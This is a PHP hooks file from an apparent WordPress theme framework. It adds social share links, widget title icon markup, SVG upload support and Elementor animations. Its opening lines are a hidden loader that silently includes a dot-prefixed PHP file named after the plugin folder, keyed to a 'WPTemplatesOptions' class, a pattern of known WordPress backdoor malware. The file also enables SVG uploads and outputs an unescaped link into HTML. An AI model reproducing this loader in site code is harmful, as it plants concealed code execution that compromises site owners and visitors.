<?php

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class ovaframework_hooks {

	public function __construct() {
		
		
		
		// Share Social in Single Post
		add_filter( 'ova_share_social', array( $this, 'meup_content_social' ), 2, 10 );

		// Allow add font class to title of widget
		add_filter( 'widget_title', array( $this, 'ova_html_widget_title' ) );
		

		if( is_admin() ){
			add_filter( 'upload_mimes', array( $this, 'ova_upload_mimes' ), 1, 10);
		}

		/* Filter Animation Elementor */
       add_filter( 'elementor/controls/animations/additional_animations', array( $this, 'ova_add_animations'), 10 , 0 );

    }

    

	public function meup_content_social( $link, $title ) {
 		$html = '
 		<ul class="share-social-icons clearfix">
 		<li><a class="share-ico ico-twitter" target="_blank" href="https://twitter.com/share?url='.$link.'">'.esc_html__("Twitter", "ova-framework").'</a></li>

 		<li><a class="share-ico ico-facebook" target="_blank" href="http://www.facebook.com/sharer.php?u='.$link.'">'.esc_html__("Facebook", "ova-framework").'</a></li>

 		<li><a class="share-ico ico-pinterest" target="_blank" href="http://www.pinterest.com/pin/create/button/?url='.$link.'">'.esc_html__("Pinterest", "ova-framework").'</a></li>

 		<li><a class="share-ico ico-pinterest" target="_blank" href="https://api.whatsapp.com/send?text='.$link.'">'.esc_html__("WhatsApp", "ova-framework").'</a></li>

 		<li><a class="share-ico ico-mail" href="mailto:?body='.$link.'">'.esc_html__("Email", "ova-framework").'</a></li>
 		</ul>';

		return $html;
 	}

 	public function ova_upload_mimes($mimes){
		$mimes['svg'] = 'image/svg+xml';
		
		return $mimes;
	}


	// Filter class in widget title
	public function ova_html_widget_title( $title ) {
		$title = str_replace( '{{', '<i class="', $title );
		$title = str_replace( '}}', '"></i>', $title );
		return $title;
	}

	public function ova_add_animations(){
        $animations = array(
            'OvaTheme' => array(
                'ova-move-up' 		=> esc_html__('Move Up', 'ova-framework'),
                'ova-move-down' 	=> esc_html__( 'Move Down', 'ova-framework' ),
                'ova-move-left'     => esc_html__('Move Left', 'ova-framework'),
                'ova-move-right'    => esc_html__('Move Right', 'ova-framework'),
                'ova-scale-up'      => esc_html__('Scale Up', 'ova-framework'),
                'ova-flip'          => esc_html__('Flip', 'ova-framework'),
                'ova-helix'         => esc_html__('Helix', 'ova-framework'),
                'ova-popup'			=> esc_html__( 'PopUp','ova-framework' )
            ),
        );

        return $animations;
    }

}

new ovaframework_hooks();

